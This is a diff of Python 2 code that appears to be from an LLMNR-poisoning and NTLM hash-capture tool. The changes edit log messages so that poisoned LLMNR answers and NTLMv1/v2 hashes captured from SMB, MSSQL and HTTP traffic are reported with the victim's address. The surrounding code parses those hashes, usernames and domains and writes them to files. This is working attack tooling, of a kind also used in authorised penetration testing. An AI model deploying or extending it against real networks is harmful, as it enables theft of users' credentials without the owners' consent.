@@ -270,7 +270,7 @@ def ParseHash(data,client):
     Bcc = struct.unpack('<H',data[63:65])[0]
     if NthashLen > 60:
        Hash = data[65+LMhashLen:65+LMhashLen+NthashLen]
-       print "[+]SMB-NTLMv2 hash captured"
+       print "[+]SMB-NTLMv2 hash captured from :",client
        outfile = "SMB-NTLMv2-Client-"+client+".txt"
        pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
        var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
@@ -281,7 +281,7 @@ def ParseHash(data,client):
        print "Username : ",Username
        print "Domain (if joined, if not then computer name) : ",Domain
     if NthashLen == 24:
-       print "[+]SMB-NTLMv1 hash captured"
+       print "[+]SMB-NTLMv1 hash captured from : ",client
        outfile = "SMB-NTLMv1-Client-"+client+".txt"
        pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
        var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
@@ -536,7 +536,7 @@ def ParseSQLHash(data,client):
     LMHash = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
     NthashLen = struct.unpack('<H',data[30:32])[0]
     if NthashLen == 24:
-       print "[+]MsSQL NTLMv1 Hash detected"
+       print "[+]MsSQL NTLMv1 hash captured from :",client
        print "LM hash is: ",LMHash
        NthashOffset = struct.unpack('<H',data[32:34])[0]
        NtHash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
@@ -552,7 +552,7 @@ def ParseSQLHash(data,client):
        outfile = "MSSQL-NTLMv1-Client-"+client+".txt"
        WriteData(outfile,User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal)
     if NthashLen > 60:
-       print "[+]MSSQL NTLMv2 Hash detected"
+       print "[+]MSSQL NTLMv2 Hash captured from :",client
        DomainLen = struct.unpack('<H',data[36:38])[0]
        NthashOffset = struct.unpack('<H',data[32:34])[0]
        NthashLen = struct.unpack('<H',data[30:32])[0]
@@ -635,10 +635,10 @@ class LLMNRAns(Packet):
         self.fields["AnswerNameLen"] = struct.pack(">h",len(self.fields["AnswerName"]))[1]
         self.fields["QuestionNameLen"] = struct.pack(">h",len(self.fields["QuestionName"]))[1]
 
-def Parse_LLMNR_Name(data):
+def Parse_LLMNR_Name(data,addr):
    NameLen = struct.unpack('>B',data[12])[0]
    Name = data[13:13+NameLen]
-   print "LLMNR answer sent to that name :",Name
+   print "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(addr[0],Name)
    return Name
 
 def Parse_IPV6_Addr(data):
@@ -664,7 +664,7 @@ def RunLLMNR():
           if data[2:4] == "\x00\x00":
              if Parse_IPV6_Addr(data):
                 global Name
-                Name = Parse_LLMNR_Name(data)
+                Name = Parse_LLMNR_Name(data,addr)
                 buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
                 buff.calculate()
                 for x in range(1):
@@ -796,7 +796,7 @@ def ParseHTTPHash(data,client):
     NthashOffset = struct.unpack('<H',data[24:26])[0]
     NTHash = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
     if NthashLen == 24:
-       print "[+]HTTP NTLMv1 Hash detected"
+       print "[+]HTTP NTLMv1 hash captured from :",client
        NtHash = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
        HostNameLen = struct.unpack('<H',data[46:48])[0]
        HostNameOffset = struct.unpack('<H',data[48:50])[0]
@@ -811,7 +811,7 @@ def ParseHTTPHash(data,client):
        WriteData(outfile,WriteHash)
        print "Captured hash is : ", WriteHash
     if NthashLen > 24:
-       print "[+]HTTP NTLMv2 Hash detected"
+       print "[+]HTTP NTLMv2 hash captured from :",client
        NthashLen = 64
        DomainLen = struct.unpack('<H',data[28:30])[0]
        DomainOffset = struct.unpack('<H',data[32:34])[0]
